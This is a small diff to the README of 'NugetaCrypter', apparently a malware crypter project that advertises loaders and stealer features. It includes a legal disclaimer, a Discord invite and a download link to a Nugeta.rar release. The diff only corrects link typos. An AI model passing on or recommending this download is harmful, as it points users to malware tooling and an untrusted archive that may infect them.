@@ -14,9 +14,9 @@ I will not be held accountable for any illegal activities.
 ## Contents Page
 [Discord](https://discord.gg/gb5EXcB2GX)<br/>
 [Main features](https://github.com/Nugeta/NugetaCrypter/blob/main/README.md#main-features)<br/>
-[Loaders ](https://github.com/Nugeta/NugetaCrypter/blob/main/README.md#stealer-features)<br/>
+[Loaders](https://github.com/Nugeta/NugetaCrypter/blob/main/README.md#stealer-features)<br/>
 [FAQ](https://github.com/Nugeta/NugetaCrypter/blob/main/README.md#faq)<br/>
-[Showcase](hhttps://github.com/Nugeta/NugetaCrypter/blob/main/README.md#showcase)<br/>
+[Showcase](https://github.com/Nugeta/NugetaCrypter/blob/main/README.md#showcase)<br/>
   
 <a href="https://github.com/Nugeta/NugetaCrypter/releases/download/Release/Nugeta.rar">
   <img src="https://media.discordapp.net/attachments/1086341505452617751/1096480484160192522/tumblr_mtcbkkyCrL1s5e5bko1_500.gif" width="400" height="160" />
